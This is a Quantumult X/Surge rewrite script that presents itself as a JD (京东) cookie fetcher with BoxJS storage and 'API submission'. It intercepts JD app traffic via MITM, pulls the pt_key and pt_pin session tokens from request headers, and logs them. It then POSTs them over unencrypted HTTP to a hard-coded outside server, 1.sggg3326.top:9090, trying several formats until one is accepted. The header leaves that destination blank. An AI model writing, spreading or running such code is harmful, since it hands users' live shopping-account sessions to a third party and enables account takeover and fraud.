/**
 * @file       京东 Cookie 获取 & 自动提交 API（含变更检测）
 * @desp       获取京东 pt_key/pt_pin，写入 BoxJS，并自动提交到 API。
 * @env        CookiesJD
 * @author     魔改：https://raw.githubusercontent.com/Lxi0707/Scripts/refs/heads/X/pt_key.js
 * @updated    2026-1-10
 * @version    v2.0.1
 * @link       https://raw.githubusercontent.com/1391959853/jd-ios-ck/refs/heads/X/JD/JDcookie.js
 * ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
 * 主要功能：
 * 🔵 自动抓取京东 Cookie（pt_key + pt_pin）
 * 🔵 自动写入 BoxJS → CookiesJD
 * 🔵 自动识别该账号 Cookie  → 自动提交到 API：  
 *       
 * 🔵 提交成功会显示：昵称、是否新增、是否同步青龙成功
 * 🔵 支持  / Quantumult X / 
 * ❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀
 *
 * 📌 获取 Cookie 方法：
 *  打开京东 App
 *  
 *
 * 💬 BoxJs 变量：
 *  - CookiesJD  → 存储多账号 pt_key/pt_pin 列表
 *
 * ⚙ Surge 配置(不支持)
 * ------------------------------------------
 * [Script]
 * # 京东 cookie 获取 & API 提交（含变更判断）
 * a-JD_pt_key = type=http-request, pattern=^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(wareBusiness|serverConfig|basicConfig), script-path=https://raw.githubusercontent.com/1391959853/jd-ios-ck/refs/heads/X/JD/JDcookie.js
 *
 * [MITM]
 * hostname = %APPEND% api.m.jd.com
 *
 * ⚙ Quantumult X 配置
 * ------------------------------------------
 * [rewrite_local]
 * ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(wareBusiness|serverConfig|basicConfig) url script-request-header https://raw.githubusercontent.com/randomshit699/surge/refs/heads/X/JD/JDcookie.js
 *
 * [mitm]
 * hostname = api.m.jd.com
 *
 * ⚙ Loon 配置（不支持）
 * ------------------------------------------
 * [Script]
 * http-request ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(wareBusiness|serverConfig|basicConfig) script-path=https://raw.githubusercontent.com/randomshit699/surge/refs/heads/X/JD/JDcookie.js, timeout=10, tag=京东Cookie获取
 *
 * [MITM]
 * hostname = api.m.jd.com
 *
 * ❗ 提示
 * - 获取 Cookie 后无需频繁触发；只有 pt_key 变更时才会自动推送 & 提交 API。
 * - 使用 QX 时如出现“重写关闭”的提示，需开启 rewrite & MITM。
 *
 * ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
 */



/**
 * 京东Cookie获取并自动提交到API服务器
 * 功能：
 * 1. 保存到 BoxJS 的 CookiesJD（原功能）
 * 2. 自动提交到远程API服务器（新功能）
 * 日期：2026年1月10日
 */

/**
 * 京东 Cookie 获取 & 自动提交 API（Quantumult X 专用版）
 * 适配您的 API 服务器
 */

const API_URL = "http://1.sggg3326.top:9090/jd/raw_ck";  // 使用 HTTP

// 获取请求头中的 Cookie
let cookie = $request.headers['Cookie'] || $request.headers['cookie'];

// 提取 pt_pin 和 pt_key
let ptPinMatch = cookie.match(/pt_pin=([^; ]+)(?=;?)/);
let ptKeyMatch = cookie.match(/pt_key=([^; ]+)(?=;?)/);

if (ptPinMatch && ptKeyMatch) {
    let pt_pin = decodeURIComponent(ptPinMatch[1]);
    let pt_key = ptKeyMatch[1];
    
    console.log(`提取到的 pt_pin: ${pt_pin}`);
    console.log(`提取到的 pt_key: ${pt_key}`);
    
    // 1. 写入 BoxJS（QX 使用 $prefs）
    let newCookie = `pt_key=${pt_key};pt_pin=${pt_pin};`;
    saveToBoxJS(pt_pin, newCookie);
    
    // 2. 提交到 API（根据您的 API 期望的格式）
    submitToAPI(pt_pin, pt_key, newCookie);
} else {
    console.log("无法提取 pt_pin 或 pt_key");
    $done({});
}

// 保存到 BoxJS（QX 版本）
function saveToBoxJS(pt_pin, newCookie) {
    try {
        // Quantumult X 使用 $prefs
        let cookiesListRaw = $prefs.valueForKey("CookiesJD");
        let cookiesList = [];
        
        if (cookiesListRaw) {
            try {
                cookiesList = JSON.parse(cookiesListRaw);
            } catch (e) {
                console.log("解析 CookiesJD 失败，重置为空数组");
                cookiesList = [];
            }
        }
        
        let found = false;
        for (let i = 0; i < cookiesList.length; i++) {
            if (cookiesList[i].userName === pt_pin) {
                if (cookiesList[i].cookie !== newCookie) {
                    cookiesList[i].cookie = newCookie;
                    console.log(`更新账号 ${pt_pin} 的 Cookie`);
                } else {
                    console.log(`账号 ${pt_pin} 的 Cookie 无变化`);
                }
                found = true;
                break;
            }
        }
        
        if (!found) {
            cookiesList.push({
                userName: pt_pin,
                cookie: newCookie
            });
            console.log(`新增账号 ${pt_pin}`);
        }
        
        // QX 使用 $prefs.setValueForKey
        let success = $prefs.setValueForKey(JSON.stringify(cookiesList), "CookiesJD");
        if (success) {
            console.log("✅ 成功写入 CookiesJD 至 BoxJS (QX)");
        } else {
            console.log("❌ 写入 CookiesJD 失败");
        }
    } catch (e) {
        console.log("处理 BoxJS 时出错: " + e);
    }
}

// 提交到 API（QX 版本）
function submitToAPI(pt_pin, pt_key, cookie) {
    console.log(`正在提交到 API: ${API_URL}`);
    
    // 根据您的 API 代码，尝试不同的数据格式
    const formatTests = [
        {
            name: "格式1: JSON对象包含pt_key和pt_pin",
            body: JSON.stringify({
                pt_key: pt_key,
                pt_pin: pt_pin
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        },
        {
            name: "格式2: JSON对象包含cookie字段",
            body: JSON.stringify({
                cookie: cookie
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        },
        {
            name: "格式3: 纯JSON字符串",
            body: JSON.stringify(cookie),
            headers: {
                'Content-Type': 'application/json'
            }
        },
        {
            name: "格式4: 纯文本格式",
            body: cookie,
            headers: {
                'Content-Type': 'text/plain'
            }
        }
    ];
    
    console.log(`尝试提交到API服务器: ${API_URL}`);
    
    // 测试第一种格式（JSON对象）
    testFormat(0);
    
    function testFormat(index) {
        if (index >= formatTests.length) {
            console.log("所有格式测试失败");
            notifyResult(pt_pin, false, "所有格式测试失败");
            $done({});
            return;
        }
        
        const test = formatTests[index];
        console.log(`\n尝试 ${test.name}`);
        console.log(`请求头: ${JSON.stringify(test.headers)}`);
        console.log(`请求体: ${test.body.substring(0, 100)}...`);
        
        // Quantumult X 使用 $task.fetch
        const request = {
            url: API_URL,
            method: 'POST',
            headers: test.headers,
            body: test.body,
            timeout: 10000  // 10秒超时
        };
        
        $task.fetch(request).then(
            function(response) {
                // 成功回调
                console.log(`格式 ${index+1} 返回状态码: ${response.statusCode}`);
                console.log(`格式 ${index+1} 返回数据: ${response.body || "无"}`);
                
                const data = response.body;
                if (data && typeof data === 'string') {
                    if (data.includes("ok")) {
                        console.log(`✅ 格式 ${index+1} 提交成功: ${test.name}`);
                        
                        // 解析API返回的详细信息
                        const parts = data.split(',');
                        let resultMessage = "提交成功";
                        if (parts.length > 1) {
                            const statusMessages = parts.slice(1); // 去掉开头的 "ok"
                            resultMessage = statusMessages.join(', ');
                        }
                        
                        notifyResult(pt_pin, true, resultMessage);
                        $done({});
                    } else if (data.includes("fail")) {
                        console.log(`❌ 格式 ${index+1} 被拒绝: ${data}`);
                        // 尝试下一种格式
                        testFormat(index + 1);
                    } else {
                        // 未知返回，也尝试下一种格式
                        console.log(`⚠️ 格式 ${index+1} 返回未知: ${data}`);
                        testFormat(index + 1);
                    }
                } else {
                    console.log(`⚠️ 格式 ${index+1} 无返回数据或返回非字符串`);
                    testFormat(index + 1);
                }
            },
            function(reason) {
                // 失败回调
                console.log(`格式 ${index+1} 提交失败: ${reason.error || reason}`);
                // 尝试下一种格式
                testFormat(index + 1);
            }
        );
    }
}

// 发送通知（QX 版本）
function notifyResult(pt_pin, success, message) {
    let title = success ? "✅ 京东Cookie提交成功" : "❌ 京东Cookie提交失败";
    let subtitle = "账号: " + pt_pin;
    let body = message;
    
    console.log(`${title} - ${subtitle} - ${body}`);
    
    // Quantumult X 使用 $notify
    if (typeof $notify !== 'undefined') {
        $notify(title, subtitle, body);
    }
}
